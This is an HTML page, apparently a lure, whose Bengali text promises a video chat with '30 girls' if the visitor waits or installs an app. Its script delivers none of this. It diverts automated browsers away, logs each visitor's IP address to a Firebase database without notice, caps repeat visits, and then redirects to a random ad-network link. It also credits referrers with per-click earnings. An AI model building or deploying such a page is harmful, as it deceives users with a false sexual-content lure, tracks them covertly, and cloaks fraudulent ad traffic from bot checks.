<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Connecting...</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'Segoe UI', sans-serif; }
        .spinner { width: 50px; height: 50px; border: 5px solid #111; border-top-color: #ec4899; border-radius: 50%; animation: spin 0.7s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .pink-glow { text-shadow: 0 0 10px rgba(236, 72, 153, 0.5); }
    </style>
</head>
<body>

    <div class="text-center px-6 animate-pulse">
        <div class="spinner mx-auto mb-6"></div>
        <h2 id="main-text" class="text-2xl font-bold text-pink-500 pink-glow mb-2">💖 ভিডিও চ্যাট আনলক হচ্ছে...</h2>
        <p id="sub-text" class="text-gray-300 text-sm italic">৩০ জন মেয়ের সাথে সরাসরি কথা বলার সুযোগ পান</p>
        <div class="mt-4 text-[10px] text-gray-600 uppercase tracking-widest">Secure Connection Active</div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
        import { getFirestore, doc, setDoc, increment, getDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore.js";

        const CONFIG = {
            MAX_CLICKS: 2, 
            WINDOW_HOURS: 12,
            TRASH_URL: "https://www.google.com",
            AD_LINKS: [
                "https://brewingeasel.com/exb2js3wf7?key=8dec1fe6817c7208022c2ca0c1282a48",
                "https://brewingeasel.com/ftv2xc7x?key=27c75bb93182e2bb211de9041eb9af29",
                "https://brewingeasel.com/ernsznt05?key=332c0a7f259871b6175edce3ff0158af",
                "https://brewingeasel.com/sbt5ttfmm?key=22887dfac4b92d2faf02e0a7ad7675f4",
                "https://brewingeasel.com/biwhfqzsw?key=81d11cc23b8a94096e0fcb0136f4841e",
                "https://omg10.com/4/10842462",
                "https://omg10.com/4/10842461",
                "https://omg10.com/4/7303129",
                "https://omg10.com/4/7303833",
                "https://omg10.com/4/7460253"
            ],
            FIREBASE: { 
                apiKey: "AIzaSyCU2RfLeclEyyxzEActtl5ks1P_NPvATOE", 
                authDomain: "ns-prime-d7ca5.firebaseapp.com",
                projectId: "ns-prime-d7ca5"
            }
        };

        const HOOKS = [
            { m: "😘 ভিডিও কল আনলক হচ্ছে...", s: "অ্যাপটি ইনস্টল করলেই ৩০ জন মেয়ের সাথে সরাসরি চ্যাট করতে পারবেন!" },
            { m: "🎁 স্পেশাল অফার কনফার্ম!", s: "সাইন-আপ করুন এবং ৩০ দিন ফ্রি ভিডিও কল পান (৫ জন মেয়ে প্রতিদিন)!" }
        ];

        // ১. দ্রুত অফার রেন্ডারিং
        const hook = HOOKS[Math.floor(Math.random() * HOOKS.length)];
        document.getElementById('main-text').innerText = hook.m;
        document.getElementById('sub-text').innerText = hook.s;

        const app = initializeApp(CONFIG.FIREBASE);
        const db = getFirestore(app);
        const params = new URLSearchParams(window.location.search);
        const refCode = params.get('ref') || params.get('u');

        async function runRouter() {
            // ২. বেসিক বট ফিল্টার
            if (navigator.webdriver) { window.location.replace(CONFIG.TRASH_URL); return; }

            const now = Date.now();
            const twelveHoursMs = CONFIG.WINDOW_HOURS * 60 * 60 * 1000;

            // ৩. লোকাল প্রোটেকশন চেক
            let localStore = JSON.parse(localStorage.getItem('_ad_secure')) || { count: 0, last: 0 };
            if (now - localStore.last > twelveHoursMs) localStore = { count: 0, last: now };

            if (localStore.count >= CONFIG.MAX_CLICKS) {
                window.location.replace(CONFIG.TRASH_URL);
                return;
            }

            try {
                // ৪. আইপি ফেচিং (প্যারালাল)
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const userIP = ipData.ip.replace(/\./g, '_');
                
                const ipDocRef = doc(db, "ip_logs", userIP);
                const ipSnap = await getDoc(ipDocRef);
                
                let dbData = ipSnap.exists() ? ipSnap.data() : { count: 0, last: now };
                
                // ৫. আইপি-ভিত্তিক ১২ ঘণ্টার লিমিট চেক
                if (now - dbData.last < twelveHoursMs) {
                    if (dbData.count >= CONFIG.MAX_CLICKS) {
                        window.location.replace(CONFIG.TRASH_URL);
                        return;
                    }
                } else {
                    // সময় পার হয়ে গেলে কাউন্ট রিসেট হবে
                    dbData = { count: 0, last: now };
                }

                // ৬. ভেরিফাইড ইউজার - এখন ট্র্যাকিং এবং রিডাইরেক্ট হবে
                const finalLink = CONFIG.AD_LINKS[Math.floor(Math.random() * CONFIG.AD_LINKS.length)];
                
                // লোকাল স্টোরেজ আপডেট
                localStore.count++;
                localStore.last = dbData.last;
                localStorage.setItem('_ad_secure', JSON.stringify(localStore));

                // ডাটাবেজ আপডেট (টাকা + আইপি লগ)
                await Promise.all([
                    setDoc(ipDocRef, { count: increment(1), last: dbData.last, ip: ipData.ip }, { merge: true }),
                    trackAffiliateBalance()
                ]);

                // ৭. সুপার ফাস্ট রিডাইরেক্ট (১ সেকেন্ড ডিলে)
                setTimeout(() => {
                    window.location.replace(finalLink);
                }, 1000);

            } catch (e) {
                // কোনো এরর হলে ইউজারকে সরাসরি অ্যাড-এ পাঠানো হবে ট্রাফিক লস এড়াতে
                window.location.replace(CONFIG.AD_LINKS[0]);
            }
        }

        async function trackAffiliateBalance() {
            if (!refCode) return;
            try {
                const configSnap = await getDoc(doc(db, "settings", "config"));
                let cpm = configSnap.exists() ? (configSnap.data().globalCpm || 0) : 0;
                let earning = cpm / 1000;

                await setDoc(doc(db, "users", refCode), {
                    rawTotalImpressions: increment(1),
                    validClicks: increment(1),
                    balance: increment(earning),
                    todayEarning: increment(earning),
                    totalEarnings: increment(earning),
                    lastActive: serverTimestamp()
                }, { merge: true });
            } catch (err) {}
        }

        runRouter();
    </script>
</body>
</html>
